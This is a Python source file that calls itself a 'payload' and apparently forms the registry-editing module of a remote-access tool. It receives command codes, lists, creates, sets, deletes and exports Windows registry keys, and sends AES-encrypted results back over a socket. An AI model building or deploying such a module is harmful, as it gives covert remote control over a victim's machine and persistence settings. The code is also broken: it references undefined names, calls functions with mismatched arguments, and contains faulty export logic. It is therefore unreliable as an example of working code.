'''
REGISTRY MANAGER
VERSION : 1.0.0
AUTHOR : ISSAC

THIS IS THE PAYLOAD OF REGISTORY EDITOR

FUNCTION
- SCAN KEY

'''

import winreg
import sys
import binascii
import os

class RegEdit:
    def __init__(self, sock) -> None:
        self.sock = sock
        self.DEBUG = False
        self.root_keys = {
            'HKEY_CLASSES_ROOT': winreg.HKEY_CLASSES_ROOT,
            'HKEY_CURRENT_CONFIG': winreg.HKEY_CURRENT_CONFIG,
            'HKEY_CURRENT_USER': winreg.HKEY_CURRENT_USER,
            'HKEY_DYN_DATA': winreg.HKEY_DYN_DATA,
            'HKEY_LOCAL_MACHINE': winreg.HKEY_LOCAL_MACHINE,
            'HKEY_PERFORMANCE_DATA': winreg.HKEY_PERFORMANCE_DATA,
            'HKEY_USERS': winreg.HKEY_USERS,
        }
        self.type_str = {
            'REG_BINARY' : winreg.REG_BINARY,
            'REG_DWORD' : winreg.REG_DWORD,
            'REG_SZ' : winreg.REG_SZ,
            'REG_EXPAND_SZ' : winreg.REG_EXPAND_SZ,
            'REG_MULTI_SZ' : winreg.REG_MULTI_SZ,
        }
        self.type_winreg = {
            winreg.REG_BINARY : 'REG_BINARY',
            winreg.REG_DWORD : 'REG_DWORD',
            winreg.REG_SZ : 'REG_SZ',
            winreg.REG_EXPAND_SZ : 'REG_EXPAND_SZ',
            winreg.REG_MULTI_SZ : 'REG_MULTI_SZ',
        }

    # CHECK DATA TYPE
    def reg_type_str(self, reg_type):
        if reg_type in self.type_winreg.keys():
            return self.type_winreg[reg_type]
        else:
            return 'UNKNOWN'
        
    def reg_type_winreg(self, reg_type:str):
        if reg_type in self.type_str.keys():
            return self.type_str[reg_type]
        else:
            return None

    '''
    INITIALIZATION
    '''
    def init(self):
        result = []
        msg = ''
        for root_name in self.root_keys.keys():
            try:
                root = self.root_keys[root_name]
                with winreg.OpenKey(root, '') as key:
                    winreg.QueryInfoKey(key)
                result.append(root_name)
            except Exception as e:
                msg = e
        if len(result) > 0:
            return '1|' + ','.join([b64EnStr(x) for x in result])
        else:
            return '0|' + b64EnStr(msg)
        
    '''
    GOTO PATH
    '''
    def goto_path(self, root_name, path) -> str:
        root = self.root_keys[root_name]
        reg_path = root_name if path == root_name else path
        try:
            key = winreg.OpenKey(root, reg_path)
            pass
        except FileNotFoundError:
            pass
        
    '''
    SCAN KEY
    '''
    def scan(self, root_name, path):
        subkeys = []
        values = []
        reg_path = root_name if path == root_name else path

        try:
            root = self.root_keys[root_name]
            key = winreg.OpenKey(root, reg_path)
            
            _tuple = winreg.QueryInfoKey(key)

            # SUB KEYS
            for i in range(_tuple[0]):
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    subkeys.append(subkey_name)
                except:
                    continue

            # VALUES
            for i in range(_tuple[1]):
                try:
                    name, data, reg_type = winreg.EnumValue(key, i)

                    if reg_type == winreg.REG_BINARY:
                        hex_str = binascii.hexlify(data).decode('utf-8').upper()
                        data = ' '.join(hex_str[i:i+2] for i in range(0, len(hex_str)))
                    
                    reg_type = self.reg_type_str(reg_type)

                    values.append(','.join([b64EnStr(str(x)) for x in [name, reg_type, data]]))
                except Exception as e:
                    raise e

            return f'1|{",".join([b64EnStr(str(x)) for x in subkeys])}|{",".join([b64EnStr(str(x)) for x in values])}|{path}'
        except Exception as e:
            return f'0|{b64EnStr(str(e))}'

    '''
    SET KEY VALUE
    '''
    def reg_set(self, reg_root, reg_path, value_name, value_type, value_data):
        try:
            with winreg.OpenKey(self.root_keys[reg_root], reg_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, value_name, 0, value_type, value_data)
            return '1|'
        except Exception as e:
            return '0|' + b64EnStr(str(e))

    '''
    CREATE KEY
    '''
    def reg_create_key(self, reg_root, reg_path, key_name):
        try:
            with winreg.OpenKey(self.root_keys[reg_root], reg_path, 0, winreg.KEY_WRITE) as root_key:
                winreg.CreateKey(root_key, key_name)
            return '1|' + os.path.join(reg_path, key_name)
        except Exception as e:
            return '0|' + b64EnStr(str(e))

    '''
    CREATE VALUE
    '''
    def reg_create_value(self, reg_root, reg_path, value_name, value_type:str, value_data:str):
        with winreg.OpenKey(self.root_keys[reg_root], reg_path, 0, winreg.KEY_WRITE) as key:
            try:
                _type = self.type_str[value_type]
                if _type == winreg.REG_SZ or _type == winreg.REG_EXPAND_SZ:
                    winreg.SetValueEx(key, value_name, 0, _type, value_data)
                elif _type == winreg.REG_DWORD:
                    winreg.SetValueEx(key, value_name, 0, _type, int(value_data))
                elif _type == winreg.REG_BINARY:
                    winreg.SetValueEx(key, value_name, 0, _type, value_data.encode('utf-8'))
                elif _type == winreg.REG_MULTI_SZ:
                    winreg.SetValueEx(key, value_name, 0, _type, value_data.split('\n'))
                return f'1|{reg_root}|{reg_path}|{value_name}|{value_data}'
            except Exception as e:
                return '0|' + b64EnStr(str(e))

    '''
    DELETE
    '''
    def delete_registry_value(self, root_name:str, key_path:str, value_name:str):
        try:
            with winreg.OpenKey(self.root_keys[root_name], key_path, 0, winreg.KEY_ALL_ACCESS) as key:
                winreg.DeleteValue(key, value_name)
            return '1|'
        except Exception as e:
            return f'0|{b64EnStr(e)}'
        
    def iter_subkeys(self, key):
        subkey_names = []
        try:
            i = 0
            while True:
                subkey_name = winreg.EnumKey(key, i)
                subkey_names.append(subkey_name)
                i += 1
        except Exception as e:
            pass
        return subkey_names

    def reg_delete(self, root_name:str, path:str, iskey:bool) -> str:
        if iskey:
            try:
                with winreg.OpenKey(self.root_keys[root_name], path, 0, winreg.KEY_ALL_ACCESS) as key:
                    for subkey_name in self.iter_subkeys(key):
                        subkey_path = rf'{path}\{subkey_name}'
                        self.delete_registry_value(subkey_path)
                return f'1|'
            except Exception as e:
                return f'0|{b64EnStr(e)}'
        else:
            value_name = path.split('\\')[-1]
            self.delete_registry_value(root_name, path, value_name)

    '''
    IMPORT KEY VALUE FROM .reg FILE.
    '''
    def reg_import(self):
        pass

    '''
    EXPORT KEY VALUE INTO .reg FILE
    '''
    def reg_export(self, reg_root, reg_path, reg_file):
        try:
            with open(reg_file, 'w', encoding='utf-8') as f:
                f.write('Windows Registry Editor Version 5.0.0\n\n')
                with winreg.OpenKey(self.root_keys[reg_root], reg_path) as key:
                    self.export_key(key, f, f'{reg_root}\\{reg_path}')  
        except Exception as e:
            raise e

    # RECURSION
    def export_key(self, key, f, indent, relative_root = True):
        _tuple = winreg.QueryInfoKey(key)
        for i in range(_tuple[0]):
            subkey_name = winreg.EnumKey(key, i)
            subkey = winreg.OpenKey(key, subkey_name)
            f.write(f'[{indent}\\{subkey_name}]')
            f.write('\n')
            self.export_key(subkey, f, f'{indent}\\{subkey_name}', False)
            f.write('\n')
            winreg.CloseKey(subkey)

        if relative_root:
            f.write(f'[{indent}]')
            f.write('\n')

        for i in range(_tuple[1]):
            name, data, reg_type = winreg.EnumValue(key, i)
            if reg_type == winreg.REG_SZ or reg_type == winreg.REG_EXPAND_SZ:
                f.write(f'\"{name}\"=\"{data}\"\n')
            elif reg_type == winreg.REG_DWORD:
                f.write('\"{}\"=dword:{:08x}\n'.format(name, data))
            elif reg_type == winreg.REG_QWORD:
                f.write("{}\"{}\"=hex(b):{}\n".format(indent, name, ":".join("{:02x}".format((data >> i*8) & 0xff) for i in range(8))))
            elif reg_type == winreg.REG_MULTI_SZ:
                f.write('\"{}\"=hex(7):{}\"'.format(name, ':'.join('{:02x}'.format(ord(c)) for x in data)))
            elif reg_type == winreg.REG_BINARY:
                f.write("\"{}\"=hex:{}\n".format(name, ":".join("{:02x}".format(b) for b in data)))
            elif reg_type == winreg.REG_NONE:
                f.write(f'{indent}\"{name}\"=\n')
            else:
                print(f'UNKNOWN DATA TYPE : {reg_type}')

    '''
    MAIN FUNCTION
    '''
    def run(self):
        command = para[0]
        payload = ''
        if command == 'i': # INITIALIZATION
            payload = self.init()
        elif command == 'l': # LIST
            root_name = para[1]
            reg_path = para[2]
            payload = self.scan(root_name, reg_path)
        elif command == 's': # SET
            pass
        elif command == 'nk': # NEW KEY
            root_name = para[1]
            reg_path = para[2]
            payload = self.reg_create_key(root_name, reg_path, para[3])
        elif command == 'nv': # NEW VALUE
            root_name = para[1]
            reg_path = para[2]
            payload = self.reg_create_value(root_name, reg_path, para[3], para[4], para[5])
        elif command == 'd': # DELETE
            pass
        elif command == 'g': # GOTO PATH
            payload = f'1|{str(int(self.goto_path(para[1], para[2])))}'
        elif command == 'ex': # EXPORT
            pass
        elif command == 'im': # IMPORT
            pass

        payload = f'RegEdit|{command}|{b64EnStr(payload)}'

        buffer = b64EnStr(payload)
        self.sock.send(_buffer(2, 0, AES(AES_key).encrypt_cbc(buffer.encode(), IV_value)))

if __name__ == '__main__':
    reg = RegEdit(None)
    reg.DEBUG = True
    command = sys.argv[1]
    reg_path = sys.argv[2]
    reg.reg_export('HKEY_CURRENT_USER', 'SOFTWARE', 'reg.reg')